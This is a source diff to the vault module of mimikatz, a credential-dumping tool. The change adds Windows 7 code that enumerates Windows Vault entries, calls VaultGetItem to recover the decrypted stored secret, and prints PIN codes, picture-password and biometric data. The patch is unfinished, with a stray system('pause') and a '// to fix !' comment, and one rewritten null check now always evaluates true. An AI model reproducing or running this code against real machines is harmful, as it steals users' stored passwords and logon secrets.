@@ -13,7 +13,7 @@ PVAULTGETINFORMATION VaultGetInformation = NULL;
 PVAULTENUMERATEITEMS VaultEnumerateItems = NULL;
 PVAULTCLOSEVAULT VaultCloseVault = NULL;
 PVAULTFREE VaultFree = NULL;
-
+PVAULTGETITEM7 VaultGetItem7 = NULL;
 PVAULTGETITEM8 VaultGetItem8 = NULL;
 
 BOOL isVaultInit = FALSE;
@@ -39,10 +39,10 @@ NTSTATUS kuhl_m_vault_init()
 		VaultEnumerateItems = (PVAULTENUMERATEITEMS) GetProcAddress(hVaultCli, "VaultEnumerateItems");
 		VaultCloseVault = (PVAULTCLOSEVAULT) GetProcAddress(hVaultCli, "VaultCloseVault");
 		VaultFree = (PVAULTFREE) GetProcAddress(hVaultCli, "VaultFree");
+		VaultGetItem7 = (PVAULTGETITEM7) GetProcAddress(hVaultCli, "VaultGetItem");
+		VaultGetItem8 = (PVAULTGETITEM8) VaultGetItem7;
 
-		VaultGetItem8 = (PVAULTGETITEM8)  GetProcAddress(hVaultCli, "VaultGetItem");
-
-		isVaultInit = VaultEnumerateItemTypes && VaultEnumerateVaults && VaultOpenVault && VaultGetInformation && VaultEnumerateItems && VaultCloseVault && VaultFree && VaultGetItem8;
+		isVaultInit = VaultEnumerateItemTypes && VaultEnumerateVaults && VaultOpenVault && VaultGetInformation && VaultEnumerateItems && VaultCloseVault && VaultFree && VaultGetItem7;
 
 	}
 	return STATUS_SUCCESS;
@@ -70,7 +70,7 @@ NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[])
 	LPGUID vaults;
 	HANDLE hVault;
 	PVOID items;
-	PVAULT_ITEM_7 items7;
+	PVAULT_ITEM_7 items7, pItem7;
 	PVAULT_ITEM_8 items8, pItem8;
 	NTSTATUS status;
 
@@ -91,10 +91,34 @@ NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[])
 						kprintf(L"\tItems (%u)\n", cbItems);
 						for(j = 0; j < cbItems; j++)
 						{
-							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
+							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) // to fix !
 							{
 								items7 = (PVAULT_ITEM_7) items;
-								// todo
+								kprintf(L"\t %2u.\t%s\n", j, items7[j].FriendlyName);
+								kprintf(L"\t\tType            : "); kull_m_string_displayGUID(&items7[j].SchemaId); kprintf(L"\n");
+								kprintf(L"\t\tLastWritten     : "); kull_m_string_displayLocalFileTime(&items7[j].LastWritten); kprintf(L"\n");
+								kprintf(L"\t\tFlags           : %08x\n", items7[j].Flags);
+
+								kprintf(L"\t\tRessource       : "); kuhl_m_vault_list_descItemData(items7[j].Ressource); kprintf(L"\n");
+								kprintf(L"\t\tIdentity        : "); kuhl_m_vault_list_descItemData(items7[j].Identity); kprintf(L"\n");
+								kprintf(L"\t\tAuthenticator   : "); kuhl_m_vault_list_descItemData(items7[j].Authenticator); kprintf(L"\n");
+
+								for(k = 0; k < items7[j].cbProperties; k++)
+								{
+									kprintf(L"\t\tProperty %2u     : ", k); kuhl_m_vault_list_descItemData(items7[j].Properties + k); kprintf(L"\n");
+								}
+								
+								pItem7 = NULL;
+								system("pause");
+								status = VaultGetItem7(hVault, &items7[j].SchemaId, items7[j].Ressource, items7[j].Identity, NULL, 0, &pItem7);
+
+								kprintf(L"\t\t*Authenticator* : ");
+								if(status == STATUS_SUCCESS)
+									kuhl_m_vault_list_descItemData(pItem7->Authenticator);
+								else
+									PRINT_ERROR(L"VaultGetItem7 : %08x", status);
+								kprintf(L"\n");
+								;
 							}
 							else
 							{
@@ -112,7 +136,7 @@ NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[])
 
 								for(k = 0; k < items8[j].cbProperties; k++)
 								{
-									kprintf(L"\t\tProperty %2u     : ", k); kuhl_m_vault_list_descItemData(items8[j].Properties[k]); kprintf(L"\n");
+									kprintf(L"\t\tProperty %2u     : ", k); kuhl_m_vault_list_descItemData(items8[j].Properties + k); kprintf(L"\n");
 								}
 
 								pItem8 = NULL;
@@ -222,18 +246,18 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 		kprintf(L"\n");
 	}
 
-	if(enumItem8->Properties && (enumItem8->cbProperties > 0) && enumItem8->Properties[0])
+	if(enumItem8->Properties && (enumItem8->cbProperties > 0) && enumItem8->Properties + 0)
 	{
 		switch(pGuidString->guid.Data1)
 		{
 		case 0x0b2e033f5:	// pin
-			if(enumItem8->Properties[0]->Type == ElementType_UnsignedShort)
-				kprintf(L"\t\tPIN Code        : %04hu\n", enumItem8->Properties[0]->data.UnsignedShort);
+			if((enumItem8->Properties + 0)->Type == ElementType_UnsignedShort)
+				kprintf(L"\t\tPIN Code        : %04hu\n", (enumItem8->Properties + 0)->data.UnsignedShort);
 			break;
 		case 0x0b4b8a12b:	// picture
-			if(enumItem8->Properties[0]->Type == ElementType_ByteArray)
+			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
 			{
-				pElements = (PVAULT_PICTURE_PASSWORD_ELEMENT) enumItem8->Properties[0]->data.ByteArray.Value;
+				pElements = (PVAULT_PICTURE_PASSWORD_ELEMENT) (enumItem8->Properties + 0)->data.ByteArray.Value;
 				if(bgPath)
 				{
 					kprintf(L"\t\tBackground path : %s\n", bgPath);
@@ -263,9 +287,9 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 			}
 			break;
 		case 0x0fec87291:	// biometric
-			if(enumItem8->Properties[0]->Type == ElementType_ByteArray)
+			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
 			{
-				bElements = (PVAULT_BIOMETRIC_ELEMENT) enumItem8->Properties[0]->data.ByteArray.Value;
+				bElements = (PVAULT_BIOMETRIC_ELEMENT) (enumItem8->Properties + 0)->data.ByteArray.Value;
 				bufferStart = (PWCHAR) ((PBYTE) bElements + bElements->headersize);
 				kprintf(L"\t\tProperty        : ");
 				if(bElements->domainnameLength > 1)
